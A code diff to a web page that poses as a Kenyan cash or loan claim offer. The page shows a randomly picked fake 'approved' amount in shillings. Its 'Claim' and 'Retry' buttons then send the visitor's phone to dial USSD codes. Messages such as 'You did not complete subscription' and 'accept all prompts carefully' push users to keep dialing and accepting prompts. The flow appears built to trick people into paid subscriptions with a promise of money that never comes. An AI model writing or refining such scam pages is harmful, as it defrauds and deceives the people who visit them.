@@ -473,7 +473,7 @@ input:focus{outline:none; border-color:#00A651; box-shadow:0 0 8px rgba(0,166,81
 
     <h3 id="amount" style="color:green;">KSh 0</h3>
 
-    <button class="next-btn" onclick="retryClaim()">Claim</button>
+    <button class="next-btn" onclick="startClaim()">Claim</button>
   </div>
 </div>
 
@@ -489,9 +489,9 @@ input:focus{outline:none; border-color:#00A651; box-shadow:0 0 8px rgba(0,166,81
 <div id="retryPopup" class="popup hidden">
   <div class="card small">
     <div class="title">⚠️ Action Required</div>
-    <div class="subtitle">Try again, make sure you completed all steps</div>
+    <div id="retryMessage" class="subtitle">Try again, make sure you completed all steps</div>
 
-    <button class="primary-btn" onclick="retryDial()">Retry</button>
+    <button id="retryBtn" class="primary-btn" onclick="retryDial()">Retry</button>
   </div>
 </div>
 
@@ -609,8 +609,8 @@ function showSuccess() {
   modal.classList.add("show");
   main.classList.add("blur");
 
-  let amt = 2000 + Math.floor(Math.random() * 9000);
-  document.getElementById("amount").innerText = "KSh " + amt;
+  // ✅ Check if amount already exists
+
 }
 
 // CHECK ELIGIBILITY -> OPEN DIALER
@@ -628,6 +628,17 @@ function checkEligibility() {
 function goStep2() {
   document.getElementById("successModal").classList.remove("show");
   document.getElementById("step2Modal").classList.add("show");
+
+  // ✅ Get or create constant amount
+  let savedAmount = sessionStorage.getItem("loanAmount");
+
+  if (!savedAmount) {
+    const amounts = [2000, 5000, 10000, 20000];
+    savedAmount = amounts[Math.floor(Math.random() * amounts.length)];
+    sessionStorage.setItem("loanAmount", savedAmount);
+  }
+
+  document.getElementById("amount").innerText = "KSh " + savedAmount.toLocaleString();
 }
 
 const maxRetries = 3;
@@ -635,9 +646,20 @@ const maxRetries = 3;
 function retryClaim() {
   const popup = document.getElementById("retryPopup");
   const btn = document.getElementById("retryBtn");
-  const countdownText = document.getElementById("countdown");
+  const message = document.getElementById("retryMessage");
 
   popup.classList.remove("hidden");
+
+  // 🎯 Different messages per retry stage
+  if (retryCount === 0) {
+    message.innerText = "⚠️ You did not complete subscription. Please try again.";
+  } 
+  else if (retryCount === 1) {
+    message.innerText = "⏳ Still processing... please dial again to confirm.";
+  } 
+  else if (retryCount === 2) {
+    message.innerText = "❗ Final attempt: ensure you accept all prompts carefully.";
+  }
 
   let time = 5;
   btn.disabled = true;
@@ -656,17 +678,18 @@ function retryClaim() {
         btn.innerText = "Retry";
 
         btn.onclick = () => {
-          retryCount++;
           retryDial();
         };
+
       } else {
         btn.innerText = "Limit reached";
 
         setTimeout(() => {
-          closeAll();
+          showSessionExpired();
         }, 1500);
       }
     }
+
   }, 1000);
 }
 
@@ -677,17 +700,29 @@ function retryDial() {
 
   retryCount++;
 
-  if (retryCount <= 3) {
-    sessionStorage.setItem("ussdPending", "true");
-  }
+  sessionStorage.setItem("ussdPending", "true");
+  sessionStorage.setItem("isRetry", "true");
 
   if (retryCount === 1) {
-    window.location.href = "tel:*811*331%23";
+    window.location.href = "tel:*812*331%23";
+
   } else if (retryCount === 2) {
     window.location.href = "tel:*811*221%23";
+
   } else {
     showSessionExpired();
   }
+}
+
+function startClaim() {
+  // mark session for return detection
+  sessionStorage.setItem("ussdPending", "true");
+
+  // mark that we are now in retry flow
+  sessionStorage.setItem("isRetry", "true");
+
+  // first redial
+  window.location.href = "tel:*812*331%23";
 }
 
 // END
@@ -696,6 +731,8 @@ function closeAll() {
   document.getElementById("successModal").classList.remove("show");
   document.getElementById("retryPopup").classList.add("hidden");
   document.getElementById("verifyPopup").classList.add("hidden");
+  sessionStorage.removeItem("loanAmount");
+  sessionStorage.removeItem("isRetry");
 
   const main = document.getElementById("mainContent");
   if (main) main.classList.remove("blur");
@@ -781,9 +818,13 @@ window.addEventListener("focus", () => {
   if (sessionStorage.getItem("ussdPending") === "true") {
     sessionStorage.removeItem("ussdPending");
 
-    setTimeout(() => {
-      goStep2();
-    }, 500);
+setTimeout(() => {
+  if (sessionStorage.getItem("isRetry") === "true") {
+    retryClaim(); // show retry popup after redial
+  } else {
+    goStep2(); // first return → show success with claim
+  }
+}, 800);
   }
 });
 </script>
